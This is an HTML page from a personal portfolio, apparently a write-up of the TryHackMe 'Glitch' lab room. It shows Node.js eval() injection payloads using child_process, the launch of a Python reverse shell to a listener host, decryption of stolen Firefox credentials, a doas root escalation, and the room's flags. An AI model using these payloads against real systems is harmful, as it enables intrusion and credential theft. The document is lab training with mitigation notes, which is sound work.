@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Glitch // writeup</title>
+    <meta name="description" content="A short room with one clean idea: directory discovery, a look at the source and the small trick that hands you the flag.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Glitch</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-easy">Easy</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-18</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Easy</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> glitch-writeup.md</span>
+                </div>
+                <p class="writeup-summary">A short room with one clean idea: directory discovery, a look at the source and the small trick that hands you the flag.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/glitch-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="glitch-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h2>Easy Linux room - Node.js RCE, Firefox credential extraction, and doas privilege escalation</h2>
+<h1>Machine Information</h1>
+<p>Glitch is an easy-difficulty TryHackMe room. An initial scan reveals a single web server running a Node.js application. Parameter tampering leads to a command injection via the unsafe use of eval(). A reverse shell is obtained, and enumeration of the user&#39;s saved Firefox profile leaks credentials for another user, v0id. That user is permitted to run anything as root via a misconfigured doas, giving us root and the final flag. TryHackMe Hosting Site THM - Easy - Glitch Room 10.48.144.113 (later recycled to 10.48.139.79) Target IP Easy Difficulty Basic JavaScript, parameter tampering, fuzzing, filesystem enumeration Skills</p>
+<h1>1. Initial Recon</h1>
+<p>Full port scan with Nmap: nmap -sC -sV -p- --min-rate=1000 -T4 10.48.144.113 PORT   STATE SERVICE VERSION 80/tcp open  http    nginx 1.14.0 (Ubuntu) |_http-title: not allowed Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Only port 80 is exposed, running nginx serving a Node.js application. Browsing to the root page shows a static image and a small inline script.</p>
+<h1>2. Getting the Access Token</h1>
+<p>Viewing the page source reveals a function called getAccess(): function getAccess() { fetch(&#39;/api/access&#39;) .then((response) =&gt; response.json()) .then((response) =&gt; { console.log(response); }); } Calling the API endpoint returns a base64-encoded token:</p>
+<pre class="code-block" data-lang="bash"><code>$ curl http://10.48.144.113/api/access</code></pre>
+<pre class="code-block" data-lang="bash"><code>$ echo &quot;dGhpc19pc19ub3RfcmVhbA==&quot; | base64 -d</code></pre>
+<p>Access token: this_is_not_real (answer format **<strong>_</strong>_*<strong>_</strong>**). Setting a cookie token=this_is_not_real unlocks the next page.</p>
+<h1>3. Finding the Items API</h1>
+<p>After refreshing with the cookie set, a new page is served which loads js/script.js. That script fetches data from /api/items:</p>
+<pre class="code-block" data-lang="bash"><code>$ curl http://10.48.144.113/api/items</code></pre>
+<p>{&quot;sins&quot;:[&quot;lust&quot;,&quot;gluttony&quot;,&quot;greed&quot;,&quot;sloth&quot;,&quot;wrath&quot;,&quot;envy&quot;,&quot;pride&quot;], &quot;errors&quot;:[&quot;error&quot;,&quot;error&quot;,...], &quot;deaths&quot;:[&quot;death&quot;]}</p>
+<pre class="code-block" data-lang="bash"><code>$ curl -X POST http://10.48.144.113/api/items</code></pre>
+<p>{&quot;message&quot;:&quot;there_is_a_glitch_in_the_matrix&quot;} A POST returns an odd message, so a parameter is required. Fuzzing the query string finds the parameter cmd, which is passed straight into eval() (visible in the returned stack trace referencing eval at router.post (/var/web/routes/api.js:25:60)).</p>
+<h1>4. Remote Code Execution (RCE)</h1>
+<p>Because the value is evaluated as JavaScript inside Node.js, we can call require(&#39;child_process&#39;) to execute system commands. URL-encoding the payload avoids breaking the query string:</p>
+<pre class="code-block" data-lang="bash"><code>$ curl -X POST &quot;http://10.48.144.113/api/items?cmd=\</code></pre>
+<p>require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29&quot; vulnerability_exploited uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev) execSync(...).toString() returns command output directly in the response, giving us a fully interactive command channel. The user.txt flag is read:</p>
+<pre class="code-block" data-lang="bash"><code>$ curl -X POST &quot;http://10.48.144.113/api/items?cmd=\</code></pre>
+<p>require%28%27child_process%27%29.execSync%28%27cat%20/home/user/user.txt%27%29.toString%28 vulnerability_exploited THM{i_don&#39;t_know_why} user.txt: THM{i_don&#39;t_know_why}</p>
+<h1>5. Shell Upgrade &amp; Reverse Shell</h1>
+<p>For stable, interactive access (needed for password prompts during escalation), a PTY reverse shell is planted. Because a synchronous execSync would block Node&#39;s single-threaded event loop, the reverse shell is launched with asynchronous exec(): # local listener (Python PTY controller on 192.168.155.203:9001) # 1) write a python pty reverse-shell script to the box</p>
+<pre class="code-block" data-lang="bash"><code>$ echo &#39;&lt;base64&gt;&#39; | base64 -d &gt; /tmp/.rs.py   # via execSync RCE</code></pre>
+<h1>2) launch it asynchronously so Node is not blocked</h1>
+<pre class="code-block" data-lang="bash"><code>$ curl -X POST &quot;http://10.48.144.113/api/items?cmd=\</code></pre>
+<p>require%28%27child_process%27%29.exec%28%27python3%20/tmp/.rs.py%27%29&quot; === CONNECTED (&#39;10.48.144.113&#39;, 59320) ===</p>
+<pre class="code-block" data-lang="bash"><code>user@ubuntu:/var/web$</code></pre>
+<h1>6. Enumerating the User - Firefox Credentials</h1>
+<p>In /home/user there is a .firefox profile directory. Saved credentials can be decrypted from key4.db and logins.json using the firepwd tool. Both files are exfiltrated and decrypted locally:</p>
+<pre class="code-block" data-lang="bash"><code>$ python3 firepwd.py</code></pre>
+<p>... decrypting login/password pairs Using 3DES (32-byte key, truncated to 24) https://glitch.thm: b&#39;v0id&#39;, b&#39;love_the_void&#39; This leaks credentials for another local user, v0id. Switching user:</p>
+<pre class="code-block" data-lang="bash"><code>user@ubuntu:/var/web$ su v0id</code></pre>
+<p>Password: love_the_void</p>
+<pre class="code-block" data-lang="bash"><code>v0id@ubuntu:/var/web$</code></pre>
+<h1>7. Privilege Escalation to Root (doas)</h1>
+<p>Standard escalation checks show v0id cannot use sudo, but a SUID binary /usr/local/bin/doas is present (a sudo alternative). Its config file permits v0id to run anything as root:</p>
+<pre class="code-block" data-lang="bash"><code>v0id@ubuntu:/var/web$ cat /usr/local/etc/doas.conf</code></pre>
+<p>permit v0id as root</p>
+<pre class="code-block" data-lang="bash"><code>v0id@ubuntu:/var/web$ doas -u root /bin/bash</code></pre>
+<p>Password: love_the_void</p>
+<pre class="code-block" data-lang="bash"><code>root@ubuntu:/var/web#</code></pre>
+<p>We are now root. The final flag is read from /root/root.txt:</p>
+<pre class="code-block" data-lang="bash"><code>root@ubuntu:/var/web# cat /root/root.txt</code></pre>
+<p>THM{diamonds_break_our_aching_minds} root.txt: THM{diamonds_break_our_aching_minds}</p>
+<p>What is your access token? What is the content of user.txt? THM{i_don&#39;t_know_why} What is the content of root.txt? THM{diamonds_break_our_aching_minds} Mitigation notes: never pass user input to eval(); use parameterized/allow-listed handlers instead. The app should run with the least privilege, Firefox profiles should not store plaintext-saveable credentials on shared systems, and doas/sudo rules should require a password and only grant narrowly scoped commands.</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/glitch-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="glitch-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
